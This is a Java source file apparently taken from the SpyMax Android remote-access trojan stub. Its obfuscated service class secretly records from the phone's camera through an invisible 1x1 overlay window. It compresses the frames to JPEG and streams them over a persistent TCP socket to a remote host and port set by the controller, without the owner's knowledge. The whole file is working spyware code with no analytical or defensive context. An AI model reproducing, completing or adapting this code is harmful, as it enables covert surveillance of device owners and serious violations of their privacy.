package spymax.stub7;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.os.Build;
import android.os.IBinder;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;




public class ClassGen6 extends Service implements SurfaceHolder.Callback  {
    public static Camera c_ClassGen6_m = null;
    public static Socket s_ClassGen6_k;
    public static OutputStream o_ClassGen6_ut;
    public static WindowManager w_ClassGen6_m;
    public static SurfaceView s_ClassGen6_fw;
    public static WindowManager.LayoutParams la_ClassGen6_y;
    public boolean usd = false ,ctd = false,Lo = false;
    private List<byte[]> b_ClassGen6_ts = new ArrayList<byte[]>();
    private static Object syc = new Object();
    private String vul[];
    private int q4 = 50;
    static ClassGen6 st;
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {

            sendBroadcast(new Intent(getApplicationContext(), CamActivity.class).setAction("xyz"));

            String wx =ClassGen8.FTX1;
            if (intent != null){
                if (intent.hasExtra(wx)){



                    if (ClassGen3.NeedSuper() && ClassGen12.ClassGen12wm != null && ClassGen12.ClassGen12lay != null)
                    {
                        vul  = intent.getStringArrayExtra(wx);
                        usd = c_ClassGen6_k();
                        if (usd == false) {

                            s_ClassGen6_fw = new SurfaceView(this);


                            ClassGen12.ClassGen12lay.gravity = Gravity.LEFT | Gravity.TOP ;
                            ClassGen12.ClassGen12wm.addView(s_ClassGen6_fw, ClassGen12.ClassGen12lay);
                            s_ClassGen6_fw.getHolder().addCallback(this);
                            Completed_ClassGen6_App(vul[1], Integer.valueOf(vul[2]));
                        }else{
                            sp();
                        }
                    }
                    else
                    {
                        vul  = intent.getStringArrayExtra(wx);
                        usd = c_ClassGen6_k();
                        if (usd == false) {
                            w_ClassGen6_m = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
                            s_ClassGen6_fw = new SurfaceView(this);

                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                la_ClassGen6_y = new WindowManager.LayoutParams(
                                        1, 1,
                                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL  |
                                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE  |
                                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                                        PixelFormat.TRANSLUCENT
                                );

                            }else
                            {
                                la_ClassGen6_y = new WindowManager.LayoutParams(
                                        1, 1,
                                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                                        PixelFormat.TRANSLUCENT
                                );
                            }
                            la_ClassGen6_y.gravity = Gravity.LEFT | Gravity.TOP ;
                            w_ClassGen6_m.addView(s_ClassGen6_fw, la_ClassGen6_y);
                            s_ClassGen6_fw.getHolder().addCallback(this);
                            Completed_ClassGen6_App(vul[1], Integer.valueOf(vul[2]));
                        }else{
                            sp();
                        }
                    }


                }
            }
            return START_STICKY;
        }catch (Exception e){}
        return START_NOT_STICKY;
    }


    public boolean c_ClassGen6_k() {
        Camera c = null;
        try {
            c = Camera.open();
        } catch (RuntimeException e) {
            return true;
        } finally {
            if (c != null) {
                c.release();
            }
        }
        return false;
    }
    public void Completed_ClassGen6_App(final String h, final int p) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                int t = 0;
                do {
                    if(t >= 3){sp();}
                    try {
                        InetAddress ip;
                        ip = InetAddress.getByName(h);
                        InetSocketAddress sock = new InetSocketAddress(ip, p);
                        ClassGen6.s_ClassGen6_k = new Socket();
                        ClassGen6.s_ClassGen6_k.setSoTimeout(0);
                        ClassGen6.s_ClassGen6_k.setKeepAlive(true);

                        ClassGen6.s_ClassGen6_k.setTcpNoDelay(true);
                        ClassGen6.s_ClassGen6_k.connect(sock, 60000);
                        ctd = ClassGen6.s_ClassGen6_k.isConnected();
                        if (ctd == true) {
                            o_ClassGen6_ut = ClassGen6.s_ClassGen6_k.getOutputStream();
                            Lo = true;
                            p_ClassGen6_r();
                            break;
                        }
                    } catch (UnknownHostException e) {
                        di();






                    } catch (SocketException e) {
                        di();
                    } catch (Exception e) {
                        di();
                    }
                    try{ Thread.sleep(1);} catch (InterruptedException e) {}
                    t++;
                } while (ctd == false);
            }
        }).start();
    }
    private void di() {
        Lo = false;
        ClassGen11.F_ClassGen11_ORCA =false;
        try {ClassGen6.s_ClassGen6_k.shutdownOutput();} catch (SocketException e) {





              } catch (IOException e) {}
        try {ClassGen6.s_ClassGen6_k.shutdownInput();} catch (SocketException e) {} catch (IOException e) {}
        try {ClassGen6.s_ClassGen6_k.getOutputStream().close();} catch (SocketException e) {} catch (IOException e) {}
        try {ClassGen6.s_ClassGen6_k.getInputStream().close();} catch (SocketException e) {} catch (IOException e) {}
        try {ClassGen6.s_ClassGen6_k.close();} catch (SocketException e) {





              } catch (IOException e) {}
        if(o_ClassGen6_ut != null){try {
            o_ClassGen6_ut.close();} catch (SocketException e) {} catch (IOException e) {}
            o_ClassGen6_ut = null;}
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        try {
            ClassGen6.c_ClassGen6_m = Camera.open(Integer.valueOf(vul[0]));
        } catch (RuntimeException e) {}
        try {
            Camera.Parameters parameters = ClassGen6.c_ClassGen6_m.getParameters();
            Camera.Size bestSize = null;
            if (ClassGen6.c_ClassGen6_m.getParameters().getSupportedPreviewSizes() != null) {
                Camera.Parameters p = ClassGen6.c_ClassGen6_m.getParameters();
                List<Camera.Size> s = p.getSupportedPreviewSizes();
                for (Camera.Size z : s) {
                    if (z.width > 600 && z.height > 400){
                        bestSize = z;
                    }
                }
            }
            if (bestSize == null)
            {
                bestSize.width = 640;
                bestSize.height = 480;
            }
            if( Integer.valueOf(vul[4]) == 1){
                List<String> fu = parameters.getSupportedFocusModes();
                if (fu.contains(Camera.Parameters.FOCUS_MODE_CONTINUOUS_VIDEO)) {
                    parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_VIDEO);
                }
            }
            parameters.setPreviewSize(bestSize.width, bestSize.height);
            parameters.setPreviewFormat(ImageFormat.NV21);
            ClassGen6.c_ClassGen6_m.setParameters(parameters);
            ClassGen6.c_ClassGen6_m.setPreviewDisplay(surfaceHolder);

            ClassGen6.c_ClassGen6_m.startPreview();

        } catch (Exception e) {}

    }


    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {
        if (ClassGen6.c_ClassGen6_m != null) {
            ClassGen6.c_ClassGen6_m.setPreviewCallback(new Camera.PreviewCallback() {
                public void onPreviewFrame(byte[] b, Camera _camera) {
                    try {
                        try {
                            if (b == null) {return;}
                            if (ClassGen6.s_ClassGen6_k != null && ctd == true && o_ClassGen6_ut != null) {
                               // if(bts.size()<=15){

                                synchronized(syc){
                                    b_ClassGen6_ts.add(b);
                                }

                               // }

                            }
                        } catch (OutOfMemoryError e) {}
                    } catch (Exception e) {}

                }
            });
        }
    }
    public void p_ClassGen6_r() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                int clr = Integer.valueOf(vul[5]);
                while (Lo){
                    try {
                        byte[] pc = null ;
                        try
                        {
                            synchronized(ClassGen6.syc){
                                if(b_ClassGen6_ts.size() > 0){
                                    pc = (byte[]) b_ClassGen6_ts.get(0);
                                    b_ClassGen6_ts.remove(0);
                                }
                            }
                        }catch (Exception e){

                        }
                               try {
                                   Camera.Parameters prm = ClassGen6.c_ClassGen6_m.getParameters();
                                   int wid = prm.getPreviewSize().width;
                                   int Hig = prm.getPreviewSize().height;
                                   YuvImage yuv = new YuvImage(pc, ImageFormat.NV21, wid, Hig, null);
                                   ByteArrayOutputStream out_ClassGen6_0 = new ByteArrayOutputStream() ;
                                   yuv.compressToJpeg(new Rect(0, 0, wid, Hig), q4, out_ClassGen6_0);
                                   if(clr != 0){
                                       q4 = q(out_ClassGen6_0.toByteArray().length,75);
                                   }
                                   byte[] b0 = ClassGen3._formtpakt_methd_(vul[3] + vul[6] + vul[7] ,out_ClassGen6_0.toByteArray());
                                   try {

                                       ClassGen6.s_ClassGen6_k.setSendBufferSize(b0.length * 15);
                                       o_ClassGen6_ut = ClassGen6.s_ClassGen6_k.getOutputStream();
                                       o_ClassGen6_ut.write(b0,0,b0.length);
                                   } catch (Exception e) {
                                       sp();







                                   }
                                   out_ClassGen6_0.close();


                               }catch (Exception ee){}

                    } catch (Exception e)
                    {
                    }catch (OutOfMemoryError e) {}
                    try{ Thread.sleep(1);} catch (InterruptedException e) {}
                }
            }
        }).start();
    }
    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }
    public void onDestroy() {
        super.onDestroy();
        ClassGen3.s_ClassGen3_f1 = 0;
        st = null;
        sp();
    }
    public void sp() {
        try {

            if (ClassGen6.c_ClassGen6_m != null) {
                ClassGen6.c_ClassGen6_m.setPreviewCallback(null);
                ClassGen6.c_ClassGen6_m.release();
                ClassGen6.c_ClassGen6_m = null;
            }
            di();
            if (usd == false) {
                ClassGen12.ClassGen12wm.removeView(s_ClassGen6_fw);
            }
            usd = false;
        } catch (Exception e) {
        }

        Intent i = new Intent(this, ClassGen6.class);
        this.stopService(i);
    }
    private int q(int s ,int m){
        if (s > 61440) {
            m = 15;
        } else if (s > 51200) {
            m = 25;
        } else if (s > 40960) {
            m = 35;
        } else if (s > 30720) {
            m = 45;
        } else if (s > 20480) {
            m = 65;
        } else if (s > 10240) {
            m = 75;
        }
        return m;
    }
}
